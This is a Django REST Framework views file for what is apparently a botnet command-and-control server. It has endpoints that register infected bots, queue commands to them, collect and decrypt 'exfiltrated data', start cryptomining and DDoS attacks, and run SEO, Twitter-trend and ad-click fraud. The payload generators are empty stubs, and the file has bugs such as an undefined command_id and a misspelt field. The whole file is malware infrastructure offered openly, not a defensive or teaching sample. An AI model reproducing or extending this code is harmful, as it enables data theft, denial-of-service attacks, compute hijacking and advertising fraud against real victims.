from rest_framework import viewsets, status
from rest_framework.decorators import action
from rest_framework.response import Response

from django.utils import timezone
from django.db.models import Count, Q, Sum
from django.db import transaction

from .models import Bot, Command, ExfiltratedData, MiningOperation, DDOSAttack, SEOCampaign, DeliveryCampaign
from .serializers import (
    BotSerializer, CommandSerializer, ExfiltratedDataSerializer, 
    MiningOperationSerializer, DDOSStartSerializer, SEOCampaignSerializer,
    BotRegistrationSerializer, DeliveryCampaignSerializer, CommandExecutionSerializer,
)

from .utils import encrypt_data,decrypt_data
# from .commands.system_commands import SystemCommads
# from .commands.network_commands import NetworkCommands
# from .commands.data_commands import DataCommands
from .commands.special_commands import SpecialCommands
from .commands.seo_commands import SeoBooster
from .commands.social_media_booster import SocialMediaBooster

import json
import logging

logger = logging.getLogger(__name__)

class BotViewSet(viewsets.ModelViewSet):
    queryset = Bot.objects.all()
    serializer_class = BotSerializer

    @action(detail=False, methods=['post'])
    def register(self, request):
        serializer = BotRegistrationSerializer(data=request.data)
        if serializer.is_valid():
            bot_data = serializer.validated_data

            bot, created = Bot.objects.get_or_create(
                bot_id = bot_data['bot_id'],
                defaults=bot_data
            )

            if not created:
                for key, value in bot_data.items():
                    setattr(bot, key, value)
                bot.save()
            logger.info(f"Bot registered: {bot.bot_id}")
            return Response(BotSerializer(bot).data, status=status.HTTP_200_OK)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
    @action(detail=False, methods=['get'])
    def stats(self, request):
        stats = Bot.objects.aggregate(
            total_bots = Count('id'),
            online_bots = Count('id', filter=Q(status='online')),
            windows_bots = Count('id', filter=Q(platform='windows')),
            linux_bots = Count('id', filter=Q(platform='linux')),
            web_bots = Count('id', filter=Q(platform='web')),
        mobile_bots = Count('id', filter=Q(platform='android') | Q(platform='ios')),
        )
        return Response(stats)

    @action(detail=True, methods=['post'])
    def execute_command(self, request, pk=None):
        bot = self.get_object()
        command_name = request.data.get('command_name')
        command_type = request.data.get('command_type', 'system')
        parameters = request.data.get('parameters', {})

        command = Command.objects.create(
            bot=bot,
            command_name = command_name,
            command_type= command_type,
            parameters= parameters
        )
        
        logger.info(f"Command queued: {command_name} for bot {bot.bot_id}")
        return Response({
            'command_id': command_id,
            'status': 'queued',
            'bot_id': bot.bot_id
        })

class CommandViewSet(viewsets.ModelViewSet):
    queryset = Command.objects.all()
    serializer_class = CommandSerializer

    @action(detail=False, methods=['get'])
    def pending(self, request):
        bot_id = request.query_params.get('bot_id')
        if bot_id:
            commands = Command.objects.filter(
                bot_id=bot_id,
                status__in = ['pending', 'executing']
            ).order_by('created_at')

        else:
            commands = Command.objects.filter(
                status__in =['pending', 'executing']
            ).order_by('created_at')

        serializer = self.get_serializer(commands, many=True)
        return Response(serializer.data)
    
    @action(detail=True, methods=['post'])
    def update_status(self, request, pk=None):
        command = self.get_object()
        serializer = CommandExecutionSerializer(data=request.data)

        if serializer.is_valid():
            data = serializer.validated_data

            command.status = 'completed' if data.get('exit_code', 0) == 0 else 'failed'
            command.output = data.get('output', '')
            command.error = data.get('error', '')
            command.exit_code =data.get('exit_code', 0)
            command.completed_at = timezone.now()

            if command.output:
                command.encrypted_output = encrypt_data(command.output)
            command.save()
            logger.info(f'Command {command.id} completed with status {command.status}')

            return Response({'status': 'updated'})
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
    
class MiningViewSet(viewsets.ViewSet):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.special_commands = SpecialCommands()

    @action(detail=False, methods=['post'])
    def start(self ,request):
        bot_id = request.data.get('bot_id')
        algorithm = request.data.get('algorithm','cryptonight')
        intensity = request.data.get('intensity', 50)

        result = self.special_commands.start_mining(bot_id, algorithm, intensity)
        
        if result['status'] == 'mining_started':
            bot = Bot.objects.get(bot_id=bot_id)
            MiningOperation.objects.create(
                bot=bot,
                algorithm=algorithm,
                intensity=intensity
            )
        
        logger.info(f"Mining started for bot {bot_id}: {result}")
        return Response(result)
    
    @action(detail=False, methods=['post'])
    def stop(self, request):
        bot_id = request.data.get('bot_id')
        result = self.special_commands.stop_mining(bot_id)

        if result['status'] == 'mining_stopped':
            MiningOperation.objects.filter(bot__bot_id=bot_id, is_active=True).update(
                is_active=False,
                end_time=timezone.now()
            )
        logger.info(f"Mining stopped for bot {bot_id}: {result}")
        return Response(result)

class DDOSViewSet(viewsets.ViewSet):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.special_commands = SpecialCommands()

    @action(detail=False, methods=['post'])
    def start(self, request):
        bot_id = request.data.get('bot_id')
        target_url = request.data.get('target_url')
        duration = request.data.get('duration', 60)
        threads = request.data.get('threads', 20)

        result = self.special_commands.start_ddos(bot_id, target_url, duration, threads)

        if result['status'] == 'ddos_started':
            bot = Bot.objects.get(bot_id=bot_id)
            DDOSAttack.objects.create(
                bot=bot,
                target_url = target_url,
                durtion=duration
            )
        logger.info(f"DDoS started by bot {bot_id} against {target_url}")
        return Response(result)

    @action(detail=False, methods=['post'])
    def stop(self, request):
        bot_id = request.data.get('bot_id')
        result = self.special_commands.stop_ddos(bot_id)

        if result['status'] == 'ddos_stopped':
            DDOSAttack.objects.filter(bot__bot_id=bot_id, is_active=True).update(
                is_active=False,
                end_time=timezone.now()
            )
        
        logger.info(f"DDoS stopped for bot {bot_id}")
        return Response(result)

class SEOViewSet(viewsets.ViewSet):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.seo_booster = SeoBooster()
        self.social_booster = SocialMediaBooster()

    @action(detail=False, methods=['post'])
    def start_campaign(self, request):
        campaign_name = request.data.get('campaign_name')
        keyword = request.data.get('keyword')
        bots_count = request.data.get('bots_count', 10)
        duration = request.data.get('duration_hours', 24)

        result = self.seo_booster.start_trend_campaign(
            campaign_name, keyword, bots_count, duration
        )

        if result['status'] == 'campaign_started':
            SEOCampaign.objects.create(
                name=campaign_name,
                keyword=keyword,
                bots_assigned=bots_count
            )

        logger.info(f"SEO campaign started: {campaign_name} for keyword '{keyword}'")
        return Response(result)

    @action(detail=False, methods=['post'])
    def boost_twitter(self, request):
        bot_id = request.data.get('bot_id')
        keyword = request.data.get('keyword')
        tweets_count = request.data.get('tweets_count', 5)
        result = self.social_booster.boost_twitter_trend(bot_id, keyword, tweets_count)
        logger.info(f"Twitter boost started for keyword '{keyword}'")
        return Response(result)
    
    @action(detail=False, methods=['get'])
    def campaign_stats(self, request):
        campaign_name = request.query_params.get('campaign_name')
        result = self.seo_booster.get_campaign_stats(campaign_name)
        return Response(result)
    
class DeliveryViewSet(viewsets.ModelViewSet):
    queryset = DeliveryCampaign.objects.all()
    serializer_class = DeliveryCampaignSerializer

    @action(detail=False, methods=['post'])
    def create_web_delivery(self, request):
        name = request.data.get('name')
        target_url = request.data.get('target_url')
        payload_type = request.data.get('payload_type', 'javascript')

        campaign = DeliveryCampaign.objects.create(
            name=name,
            delivery_method = 'web',
            target_url = target_url,
            payload_type = payload_type
        )

        logger.info(f"Web delivery campaign crated: {name}")
        return Response(DeliveryCampaignSerializer(campaign).data)
    
    @action(detail=False, methods=['get'])
    def generate_payload(self, request):
        campaign_id = request.query_params.get('campaign_id')
        payload_type = request.query_params.get('type', 'javascript')

        #Generate appropriate payload
        if payload_type == 'javascript':
            payload = self.generate_javascript_bot()
        elif payload_type == 'python':
            payload = self.generate_python_bot()
        else:
            payload = '// Unsupported payload type'

        return Response({'payload': payload})

    def generate_javascript_bot(self):
        return
    
    def generate_python_bot(self):
        return
    
class DashboardViewSet(viewsets.ViewSet):
    @action(detail=False, methods=['get'])
    def overview(self, request):
        #Bot Staistics
        bot_stats = Bot.objects.aggregate(
            total = Count('id'),
            online = Count('id', filter=Q(status='online')),
            windows = Count('id', filter=Q(platform='windows')),
            linux = Count('id', filter=Q(platform='linux')),
            web = Count('id', filter=Q(platform='web')),
            mobile = Count('id', filter=Q(platform='android') | Q(platform='ios'))
        )

        #Command statistics
        command_stats = Command.objects.aggregate(
            total=Count('id'),
            pending = Count('id', filter=Q(status='pending')),
            executing = Count('id', filter=Q(status='executing')),
            completed = Count('id', filter=Q(status='completed'))
        )

        #Mining statistics
        mining_stats = MiningOperation.objects.filter(is_active=True).aggregate(
            active_operations=Count('id'),
            total_bots = Count('bot', distinct=True)
        )

        #DDOS statistics
        ddos_stats = DDOSAttack.objects.filter(is_active=True).aggregate(
            active_attacks=Count('id'),
            total_requests = Sum('requests_sent')
        )

        #SEO statistics
        seo_stats = SEOCampaign.objects.filter(is_active=True).aggregate(
            active_campaigns = Count('id'),
            total_searches = Sum('searches_performed')
        )

        #Recent activity
        recent_commands = Command.objects.select_related('bot').order_by('-created_at')[:10]
        recent_data = ExfiltratedData.objects.select_related('bot').order_by('-created_at')[:5]

        return Response({
            'bots_stats':bot_stats,
            'command_stats': command_stats,
            'mining_stats': mining_stats,
            'ddos_stats': ddos_stats,
            'seo_stats': seo_stats,
            'recent_commands': CommandSerializer(recent_commands, many=True).data,
            'recent_data': ExfiltratedDataSerializer(recent_data, many=True).data
        })

class ExfiltratedDataViewSet(viewsets.ModelViewSet):
    queryset = ExfiltratedData.objects.all()
    serializer_class = ExfiltratedDataSerializer

    @action(detail=True, methods=['get'])
    def download(self, request, pk=None):
        data_obj = self.get_object()

        #decrypt data for download
        decrypted_data = decrypt_data(data_obj.encrypted_data)

        response = Response(decrypted_data)
        response['Content-Disposition'] = f'attachment; filename="{data_obj.filename or data_obj.id}.bin"'
        return response
    
    @action(detail=False, methods=['post'])
    def upload(self, request):
        bot_id = request.data.get('bot_id')
        data_type = request.data.get('data_type')
        data_content = request.data.get('data')

        try:
            bot = Bot.objects.get(bot_id=bot_id)
        except Bot.DoesNotExist:
            return Response({'error': 'Bot not found'}, status=status.HTTP_404_NOT_FOUND)
        
        encrypted_data = encrypt_data(data_content)

        exfiltrated_data = ExfiltratedData.objects.create(
            bot=bot,
            data_type=data_type,
            filename = request.data.get('filename', ''),
            description = request.data.get('description', ''),
            encrypted_data = encrypted_data,
            data_size = len(data_content)
        )

        return Response({'id': exfiltrated_data.id})

class AdClickingViewSet(viewsets.ViewSet):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.special_commands = SpecialCommands()

    @action(detail=False, methods=['post'])
    def start(self, request):
        bot_id = request.data.get('bot_id')
        websites = request.data.get('websites')
        clicks_per_site = request.data.get('clicks_per_site', 5)

        result = self.special_commands.start_ad_clicking(bot_id, websites, clicks_per_site)

        logger.info(f"Ad clicking started for bot {bot_id}: {result} ")
        return Response(result)